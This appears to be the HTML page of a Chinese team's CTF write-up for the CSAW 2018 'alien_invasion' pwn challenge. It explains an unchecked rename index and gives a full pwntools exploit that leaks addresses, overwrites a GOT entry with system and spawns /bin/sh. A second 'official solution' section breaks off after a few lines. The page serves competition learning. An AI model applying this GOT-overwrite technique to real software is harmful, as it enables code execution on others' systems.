@@ -1,0 +1,909 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="DF Team CTF writeups">
+      
+      
+        <link rel="canonical" href="https://A30lu5.github.io/blogs/CSAW-CTF-2018-Quals/pwn/alien_invasion/writeup/">
+      
+      
+        <meta name="author" content="DF Team">
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../..">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.0.4">
+    
+    
+      
+        <title>Writeup - DF Team</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.451f80e5.css">
+      
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#7cb342">
+      
+    
+    
+      <script src="../../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+        <link href="https://gstatic.loli.net" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.loli.net/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
+        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../../assets/fonts/material-icons.css">
+    
+      <link rel="stylesheet" href="../../../../_static/css/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="light-green" data-md-color-accent="light-green">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="../../../../#_1" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://A30lu5.github.io/blogs/" title="DF Team" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                DF Team
+              </span>
+              <span class="md-header-nav__topic">
+                Writeup
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/A30lu5/blogs/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      A30lu5/blogs
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+<nav class="md-tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../.." title="Introduction" class="md-tabs__link">
+          Introduction
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://A30lu5.github.io/blogs/" title="DF Team" class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </a>
+    DF Team
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/A30lu5/blogs/" title="前往 Github 仓库" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      A30lu5/blogs
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      Introduction
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        Introduction
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../.." title="Getting Started" class="md-nav__link">
+      Getting Started
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2" type="checkbox" id="nav-1-2">
+    
+    <label class="md-nav__link" for="nav-1-2">
+      noxCTF2018
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-1-2">
+        noxCTF2018
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1-2-1" type="checkbox" id="nav-1-2-1">
+    
+    <label class="md-nav__link" for="nav-1-2-1">
+      Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-1-2-1">
+        Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/pwn/believeMe/writeup/" title="believe Me" class="md-nav__link">
+      believe Me
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/pwn/TheNameCalculator/writeup/" title="The Name Calculator" class="md-nav__link">
+      The Name Calculator
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/pwn/GroceryList/writeup/" title="Grocery List" class="md-nav__link">
+      Grocery List
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../noxCTF2018/pwn/TheBlackCanary/writeup/" title="The Black Canary" class="md-nav__link">
+      The Black Canary
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="个人解法" class="md-nav__link">
+    个人解法
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="官方解法" class="md-nav__link">
+    官方解法
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/A30lu5/blogs/blob/master/docs/CSAW-CTF-2018-Quals/pwn/alien_invasion/writeup.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                  <h1>Writeup</h1>
+                
+                <blockquote>
+<p>Construct additional pylons</p>
+</blockquote>
+<p>改名的时候未检查输出索引值的大小，因此可正可负，可以随意越界，从而构造内存泄露地址，最终改GOT表值，将<code>strtol</code>的值改为<code>system</code>，获取shell。</p>
+<p>不过感觉这题非预期了</p>
+<h2 id="_1">个人解法<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python2</span>
+<span class="c1"># coding: utf-8</span>
+<span class="c1"># Usage: ./exploit.py -r/-l/-d</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">itertools</span>
+
+<span class="n">IP</span> <span class="o">=</span> <span class="s2">&quot;pwn.chal.csaw.io&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">9004</span>
+<span class="c1"># IP = &quot;127.0.0.1&quot;</span>
+<span class="c1"># PORT = 8000</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;DEBUG&#39;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>
+<span class="n">BIN</span> <span class="o">=</span> <span class="s2">&quot;./aliensVSsamurais&quot;</span>
+
+
+<span class="k">def</span> <span class="nf">r</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">ru</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">rud</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">se</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">sel</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">pick32</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">u32</span><span class="p">(</span><span class="n">x</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">pick64</span><span class="p">(</span><span class="n">x</span><span class="p">):</span> <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">x</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">))</span>
+
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="s1">&#39;--debugger&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="s1">&#39;--remote&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;-l&#39;</span><span class="p">,</span> <span class="s1">&#39;--local&#39;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+
+<span class="c1"># context.binary = args.binary # this just hangs???</span>
+
+
+<span class="n">io</span> <span class="o">=</span> <span class="bp">None</span>  <span class="c1"># this is global process variable</span>
+
+<span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BIN</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">remote</span><span class="p">:</span>
+    <span class="n">context</span><span class="o">.</span><span class="n">noptrace</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">IP</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>  
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc-2.23.so&quot;</span><span class="p">)</span>
+<span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">local</span> <span class="ow">or</span> <span class="n">args</span><span class="o">.</span><span class="n">debugger</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">BIN</span><span class="p">)</span>
+    <span class="n">proc_base</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">libs</span><span class="p">()[</span>
+        <span class="s2">&quot;/home/vagrant/DongFeng/CSAW18/pwn/alien_invasion/aliensVSsamurais&quot;</span><span class="p">]</span>
+    <span class="n">libc_bb</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">libs</span><span class="p">()[</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;</span><span class="p">]</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">print_help</span><span class="p">()</span>
+    <span class="nb">exit</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">debugger</span><span class="p">:</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">    aslr off</span>
+<span class="s1">    b *0x{:x}</span>
+<span class="s1">    b *0x{:x}</span>
+<span class="s1">    c</span>
+<span class="s1">    &#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+        <span class="n">proc_base</span><span class="o">+</span><span class="mh">0x0000000000000D39</span><span class="p">,</span>  <span class="c1"># call gets</span>
+        <span class="n">proc_base</span><span class="o">+</span><span class="mh">0x0000000000000DAD</span><span class="p">,</span>  <span class="c1"># call read</span>
+        <span class="c1"># libc_bb + one_gg</span>
+        <span class="p">)</span>
+    <span class="p">)</span>
+
+
+<span class="c1">## create two samurai</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Daimyo, nani o shitaidesu ka?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;What is my weapon&#39;s name?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Daimyo, nani o shitaidesu ka?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;What is my weapon&#39;s name?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Daimyo, nani o shitaidesu ka?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;What is my weapon&#39;s name?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;C&quot;</span><span class="o">*</span><span class="mi">7</span><span class="p">)</span>
+
+<span class="c1"># break</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Daimyo, nani o shitaidesu ka?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, what tasks do we have today.&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;How long is my name?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x60</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;What is my name?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mh">0x5f</span><span class="p">)</span>
+
+
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, what tasks do we have today.&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, which one of my babies would you like to rename?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">10</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Oh great what would you like to rename &quot;</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">rud</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">bin_base</span> <span class="o">=</span> <span class="n">data</span> <span class="o">-</span> <span class="mh">0x0202070</span>
+<span class="n">binary</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">bin_base</span>
+
+<span class="k">print</span> <span class="s2">&quot;leaked bin base: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bin_base</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x70</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, what tasks do we have today.&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, which one of my babies would you like to rename?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">400</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Oh great what would you like to rename &quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x0000000000202700</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span>
+
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, what tasks do we have today.&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, which one of my babies would you like to rename?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">401</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Oh great what would you like to rename &quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="p">]))</span>
+
+
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, what tasks do we have today.&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, which one of my babies would you like to rename?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">200</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Oh great what would you like to rename &quot;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">rud</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()[:</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="c1"># print data, data.encode(&quot;hex&quot;)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">data</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;__libc_start_main&quot;</span><span class="p">]</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
+
+<span class="k">print</span> <span class="s2">&quot;leaked libc base: &quot;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\x40</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, what tasks do we have today.&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, which one of my babies would you like to rename?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">401</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Oh great what would you like to rename &quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;strtoul&quot;</span><span class="p">]))</span>
+
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, what tasks do we have today.&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, which one of my babies would you like to rename?&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mi">200</span><span class="p">))</span>
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Oh great what would you like to rename &quot;</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]))</span>
+
+<span class="n">rud</span><span class="p">(</span><span class="s2">&quot;Brood mother, what tasks do we have today.&quot;</span><span class="p">)</span>
+<span class="n">sel</span><span class="p">(</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>
+
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+<h2 id="_2">官方解法<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+
